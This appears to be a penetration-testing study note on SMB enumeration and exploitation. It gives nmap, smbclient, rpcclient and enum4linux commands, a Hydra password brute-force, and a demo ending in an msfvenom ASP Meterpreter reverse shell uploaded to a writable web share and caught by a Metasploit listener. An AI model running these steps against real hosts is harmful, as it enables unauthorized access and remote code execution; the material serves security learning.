# SMB
- The protocol used for sharing between devices in MS and Linux
- Also known as CIFS
- SAMBA is linux version
- TCP port 139 is SMB over NETBIOS (older windows)
- TCP 445 is SMB over IP (newer)

## Enumeration Tools
- Nmap NSE
- enum4linux
- smbclient
- rpcclient

## Common Shares
C$ - C drive of remote host
Admin$ - windows install dir
IPC$ - inter-process communication

## Key points
- can you access as guest
- can you brute force
- can you read / write
- if you can write to a share can you access it later for a shell?

# Enumerate Shares
There are multiple ways to enumerate SMB shares.

```
net share
nmap 192.168.1.1 -p 445 -sV -sC --script=smb-enum-shares
smbclient -L \\192.168.1.1 --option='client min protocol=NT1'
enum4linux -S 10.10.10.10
```


## Enumrate Users RPCClient
We can use this to enumerate the server, users and domain users on the system.

`rpcclient -U "" 192.168.1.1 --option='client min protocol=NT1'`

## Connecting
Connect to SMB share:
`smbclient \\\\192.168.1.1\\SHARENAME`
 
Connect with user:
`smbclient \\\\192.168.1.1\\inetpub --option='client min protocol=NT1' -U IEUSER`

## Brute Force with Hydra
Bruce force an account with the following command:
`hydra -l IEUSER -P ~/Desktop/passwords.lst 192.168.1.1 smb`


## Enumeration Demo

 1. Use Nmap to scan and enumerate smb
```
nmap 192.168.1.1 --script=smb-enum* -p 445 -vvv
```

 2. Attempt to log in
 Using rpcclient:
 ```sh
 rpcclient -U "" 192.168.1.1
 rpcclient $> ?
 ```

 Using smbclient
 ```sh
 smbclient \\\\192.168.1.1\\SHARENAME
 ```

 3. Discover Users
 It is possible to guess using common numbers

```sh
rpcclient $> queryuser 500 (admin)
rpcclient $> queryuser 1000 (admin)
```

4. Once you have found a user, we will use hydra to brute force the password.
`hydra -l IEUSER -P passwords.lst 192.168.1.1 smb`

5. Now that we have a username and password we can run nmap again using those credentials.
```
nmap --script smb-enum* --script-args smbusername=IEUSER, smbpass=Passw0rd! -p445 192.168.1.1
```

6. This will give us signigicantly more information:
- logged in sessions
- other users
- directories

7. We'll notice this user has read / write access to the webserver "inetpub". We'll want to access this directly.
```smb
smbclient \\\\192.168.1.1\\inetpub -U IEUSER
smb: \> cd
```

8. Create .asp reverse shell using MSFVenom
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f asp > shell.asp
msfconsole -x "use /exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.168.1.1; set lport 4444; run -j"
```
`-j` - Background process


9. Moving back to our smb session:
```sh
smb:  put shell.asp shell.asp
```

10. On the exploited webserver go to the uploaded shell.asp file
A meterpreter sessions will be opened. 
```sh
msf6 exploit(multi/handler) > session 1
meterpreter > shell
```

